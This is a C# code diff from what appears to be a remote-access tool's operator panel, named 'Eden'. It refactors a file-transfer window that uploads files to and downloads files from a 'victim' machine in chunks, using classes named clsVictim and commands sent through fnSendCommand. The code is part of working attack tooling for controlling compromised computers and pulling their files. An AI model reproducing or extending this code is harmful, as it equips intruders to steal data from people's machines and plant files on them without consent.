@@ -14,17 +14,16 @@ namespace Eden
     public partial class frmFileTransfer : Form
     {
         private clsVictim m_victim;
-        private clsClient m_clnt;
         public string m_szVictimID;
 
         private string m_szCurrentDir { get; set; }
 
         private List<string> m_lszFilePath { get; set; }
-        private TransferFileType m_transferType { get; set; }
+        private clsTransferFileHandler.enMethod m_transferType { get; set; }
 
         private Queue<clsTransferFileHandler> m_qTransferFile = new Queue<clsTransferFileHandler>();
         private Dictionary<string, clsTransferFileHandler> m_dicTransferFile = new Dictionary<string, clsTransferFileHandler>();
-        private int m_nChunkSize = 1024 * 20;
+        private int m_nChunkSize = 1024 * 128;
         private bool m_bPause { get; set; }
         private bool m_bStop { get; set; }
 
@@ -32,7 +31,7 @@ namespace Eden
 
         private object m_objLock = new object();
 
-        public frmFileTransfer(clsVictim victim, string szCurrentDir, List<string> lszFilePath, TransferFileType transferType)
+        public frmFileTransfer(clsVictim victim, string szCurrentDir, List<string> lszFilePath, clsTransferFileHandler.enMethod transferType)
         {
             InitializeComponent();
 
@@ -45,79 +44,62 @@ namespace Eden
             m_transferType = transferType;
         }
 
-        void fnSrvRecv(clsClient clnt, string szVictimID, List<string> aszMsg)
+        void fnSrvRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
         {
             if (szVictimID != m_victim.m_szID)
                 return;
 
             try
             {
-                if (aszMsg[0] == "file")
+                if (lsMsg[0] == "file")
                 {
-                    if (aszMsg[1] == "uf")
+                    if (lsMsg[1] == "uf")
                     {
-                        if (aszMsg[2] == "write")
+                        if (lsMsg[2] == "write")
                         {
-                            int nIndex = int.Parse(aszMsg[3]);
-                            int nTotalSize = int.Parse(aszMsg[4]);
-                            string szFilePath = aszMsg[5];
-                            int nCode = int.Parse(aszMsg[6]);
-                            string szMsg = EZCrypto.Encoder.b64d2str(aszMsg[7]);
+                            int nCode = int.Parse(lsMsg[3]);
+                            string szRemotePath = lsMsg[4];
 
-                            if (nCode == 0)
+                            if (nCode == 1)
                             {
-                                MessageBox.Show(szMsg, "Upload File", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                                return;
-                            }
-
-                            if (!m_dicTransferFile.ContainsKey(szFilePath))
-                                return;
-
-                            clsTransferFileHandler handler = m_dicTransferFile[szFilePath];
-                            fnUpdateProgress(handler, nIndex);
-
-                            if (handler.fnbIsDone())
-                            {
-                                if (m_qTransferFile.Count == 0)
-                                    return;
-
-                                handler = m_qTransferFile.Dequeue();
-                                string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(handler.m_szRemoteFilePath)).Replace("\\", "/");
-                                fnSendNextChunk(handler, szDestFilePath);
+                                var handler = m_dicTransferFile[szRemotePath];
+                                fnUpdateProgress(handler);
+                                fnSendNextChunk(handler);
                             }
                             else
                             {
-                                fnSendNextChunk(handler, szFilePath);
+                                fnWriteLog($"Error[{szRemotePath}]: {lsMsg[5]}");
+
+                                m_dicTransferFile[szRemotePath].Dispose();
+                                m_dicTransferFile.Remove(szRemotePath);
                             }
                         }
                     }
-                    else if (aszMsg[1] == "df")
+                    else if (lsMsg[1] == "df")
                     {
-                        string szFilePath = aszMsg[2];
-                        int nIndex = int.Parse(aszMsg[3]);
-                        long nFileSize = long.Parse(aszMsg[4]);
-                        byte[] abBuffer = Convert.FromBase64String(EZCrypto.Encoder.b64d2str(aszMsg[5]));
-
-                        if (m_dicTransferFile.ContainsKey(szFilePath))
+                        if (lsMsg[2] == "read")
                         {
-                            var handler = m_dicTransferFile[szFilePath];
-                            handler.m_nFileSize = nFileSize;
-                            handler.m_nChunkSize = m_nChunkSize;
-                            handler.fnbWriteChunk(nIndex, abBuffer);
+                            int nCode = int.Parse(lsMsg[3]);
+                            string szRemotePath = lsMsg[4];
 
-                            fnUpdateProgress(handler, nIndex);
-
-                            if (handler.fnbIsDone())
+                            if (nCode == 1)
                             {
-                                if (m_qTransferFile.Count == 0)
-                                    return;
+                                byte[] abChunk = Convert.FromBase64String(lsMsg[5]);
+                                long nFileSize = long.Parse(lsMsg[6]);
+                                
+                                var handler = m_dicTransferFile[szRemotePath];
+                                handler.m_nFileSize = handler.m_nFileSize == -1 ? nFileSize : handler.m_nFileSize;
+                                handler.fnWriteChunk(abChunk);
 
-                                handler = m_qTransferFile.Dequeue();
-                                fnReadNextChunk(handler);
+                                fnUpdateProgress(handler);
+                                fnGetNextChunk(handler);
                             }
                             else
                             {
-                                fnReadNextChunk(handler);
+                                fnWriteLog($"Error[{szRemotePath}]: {lsMsg[5]}");
+
+                                m_dicTransferFile[szRemotePath].Dispose();
+                                m_dicTransferFile.Remove(szRemotePath);
                             }
                         }
                     }
@@ -135,119 +117,99 @@ namespace Eden
             richTextBox1.AppendText(Environment.NewLine);
         }
 
-        void fnUpdateProgress(clsTransferFileHandler handler, int nIndex)
+        void fnUpdateProgress(clsTransferFileHandler handler)
         {
             Invoke(new Action(() =>
             {
-                double dProgress = (double)(handler.m_nIndex / handler.fnGetChunkCount()) * 100;
-                string szFileName = Path.GetFileName(handler.m_szRemoteFilePath);
-                ListViewItem item = listView1.FindItemWithText(szFileName, true, 0);
+                if (handler.m_nFileSize == -1)
+                    return;
 
+                ListViewItem? item = listView1.FindItemWithText(handler.szRemoteFile, true, 0);
                 if (item == null)
                     return;
 
-                if (handler.fnbIsDone())
+                long nDone = handler.m_enMethod == clsTransferFileHandler.enMethod.Upload ? handler.m_nRead : handler.m_nWritten;
+                double dProgress = (double)((double)nDone / (double)handler.m_nFileSize) * 100;
+
+                item.SubItems[2].Text = dProgress.ToString("0.00") + " %";
+
+                if (nDone == handler.m_nFileSize)
                 {
                     item.SubItems[2].Text = "OK";
-                    handler.fnClose();
-                }
-                else
-                {
-                    if (item.SubItems[2].Text != "OK")
-                        item.SubItems[2].Text = ((double)nIndex / handler.fnGetChunkCount() * 100).ToString("F2") + " %";
+                    handler.m_bFinished = true;
+                    m_dicTransferFile.Remove(handler.szRemoteFile);
+
+                    toolStripProgressBar1.Increment(1);
+
+                    fnWriteLog("Completed: " + handler.m_szDstFilePath);
+
+                    if (toolStripProgressBar1.Value == m_lszFilePath.Count) //Maximum
+                        fnWriteLog("All tasks are finished.");
                 }
             }));
         }
 
-        void fnSendNextChunk(clsTransferFileHandler handler, string szFilePath)
+        void fnSendNextChunk(clsTransferFileHandler handler)
         {
-            int nRead = 0;
-            byte[] abBuffer = new byte[m_nChunkSize];
-            int nIndex = 0;
+            if (handler.m_enMethod != clsTransferFileHandler.enMethod.Upload)
+                throw new Exception("This function is for uploading.");
+            
+            string szRemoteFile = handler.szRemoteFile;
 
-            (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
-            if (nRead == 0)
+            long nRead = handler.m_nRead;
+            byte[] abChunk = handler.fnReadNextChunk();
+            if (handler.m_bFinished)
             {
-                handler.fnClose();
+                //MessageBox.Show("OK");
                 return;
             }
 
-            m_victim.fnSendCommand(string.Join("|", new string[]
+            m_victim.fnSendCommand(new string[]
             {
                 "File",
                 "uf",
                 "write",
-                szFilePath,
-                nIndex.ToString(),
                 m_nChunkSize.ToString(),
-                "0",
-                EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
-            }), false);
+                handler.m_nRead.ToString(),
+                szRemoteFile,
+                Convert.ToBase64String(abChunk),
+            });
         }
-        void fnReadNextChunk(clsTransferFileHandler handler)
+
+        void fnGetNextChunk(clsTransferFileHandler handler)
         {
-            m_victim.fnSendCommand(string.Join("|", new string[]
+            if (handler.m_enMethod != clsTransferFileHandler.enMethod.Download)
+                throw new Exception("This function is for downloading.");
+
+            if (handler.m_bFinished)
+                return;
+
+            m_victim.fnSendCommand(new string[]
             {
                 "File",
                 "df",
                 "read",
-                handler.m_nIndex.ToString(),
                 m_nChunkSize.ToString(),
-                handler.m_szRemoteFilePath,
-            }));
+                handler.m_nWritten.ToString(),
+                handler.szRemoteFile,
+                string.Empty,
+            });
         }
 
-        void fnStartTransfer(Queue<clsTransferFileHandler> qTransfer)
+        void fnStart()
         {
-            var handler = qTransfer.Dequeue();
+            if (m_dicTransferFile.Keys.Count == 0)
+                return;
 
-            if (m_transferType == TransferFileType.UploadFile)
+            var handler = m_dicTransferFile.Values.First();
+            switch (handler.m_enMethod)
             {
-                int nRead = 0;
-                byte[] abBuffer = new byte[m_nChunkSize];
-                int nIndex = 0;
-
-                string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(handler.m_szRemoteFilePath)).Replace("\\", "/");
-
-                try
-                {
-                    while (true)
-                    {
-                        (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
-                        if (nRead == 0)
-                            return;
-
-                        m_victim.fnSendCommand(string.Join("|", new string[]
-                        {
-                        "File",
-                        "uf",
-                        "write",
-                        szDestFilePath,
-                        nIndex.ToString(),
-                        m_nChunkSize.ToString(),
-                        "0",
-                        EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
-                        }), false);
-
-                        Thread.Sleep(100);
-                    }
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message);
-                }
-            }
-            else
-            {
-                m_victim.fnSendCommand(string.Join("|", new string[]
-                {
-                    "File",
-                    "df",
-                    "read",
-                    handler.m_nIndex.ToString(),
-                    m_nChunkSize.ToString(),
-                    handler.m_szRemoteFilePath,
-                }));
+                case clsTransferFileHandler.enMethod.Upload:
+                    fnSendNextChunk(handler);
+                    break;
+                case clsTransferFileHandler.enMethod.Download:
+                    fnGetNextChunk(handler);
+                    break;
             }
         }
 
@@ -256,10 +218,14 @@ namespace Eden
             //Events
             m_victim.m_clnt.ServerMessageReceived += fnSrvRecv;
 
+            toolStripProgressBar1.Maximum = m_lszFilePath.Count;
+            toolStripProgressBar1.Value = 0;
+
             //ListView init
             foreach (string szFilePath in m_lszFilePath)
             {
-                ListViewItem item = new ListViewItem(Path.GetFileName(szFilePath));
+                string szRemoteFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(szFilePath)).Replace("\\", "/");
+                ListViewItem item = new ListViewItem(szRemoteFilePath);
                 item.SubItems.Add(szFilePath);
                 item.SubItems.Add("?");
 
@@ -270,21 +236,25 @@ namespace Eden
                     Directory.CreateDirectory(szSaveDirPath);
 
                 string szLocalFilePath = string.Empty;
-                if (m_transferType == TransferFileType.UploadFile)
+                if (m_transferType == clsTransferFileHandler.enMethod.Upload)
                     szLocalFilePath = szFilePath;
                 else
                     szLocalFilePath = Path.Combine(szSaveDirPath, Path.GetFileName(szFilePath));
 
-                string szRemoteFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(szFilePath)).Replace("\\", "/");
+                string szSrcFilePath = m_transferType == clsTransferFileHandler.enMethod.Upload ? szLocalFilePath : szRemoteFilePath;
+                string szDstFilePath = m_transferType == clsTransferFileHandler.enMethod.Upload ? szRemoteFilePath : szLocalFilePath;
 
-                var handler = new clsTransferFileHandler(m_transferType, szLocalFilePath, szRemoteFilePath, m_nChunkSize);
+                clsTransferFileHandler handler = new clsTransferFileHandler(
+                    szSrcFilePath,
+                    szDstFilePath,
+                    m_transferType,
+                    m_nChunkSize
+                );
 
-                m_qTransferFile.Enqueue(handler);
-                m_dicTransferFile[szRemoteFilePath] = handler;
+                m_dicTransferFile.Add(szRemoteFilePath, handler);
             }
 
-            //Start
-            Task.Run(new Action(() => fnStartTransfer(m_qTransferFile)));
+            fnStart();
         }
 
         private void frmFileTransfer_Load(object sender, EventArgs e)
@@ -295,18 +265,14 @@ namespace Eden
         //Folder
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            Process.Start("start", m_victim.m_szDirectory);
+            Process.Start("explorer.exe", m_victim.m_szDirectory);
         }
 
         private void frmFileTransfer_FormClosed(object sender, FormClosedEventArgs e)
         {
             m_victim.m_clnt.ServerMessageReceived -= fnSrvRecv;
 
-            foreach (string szFileName in m_dicTransferFile.Keys)
-            {
-                var handler = m_dicTransferFile[szFileName];
-                handler.fnClose();
-            }
+            
         }
 
         //Pause
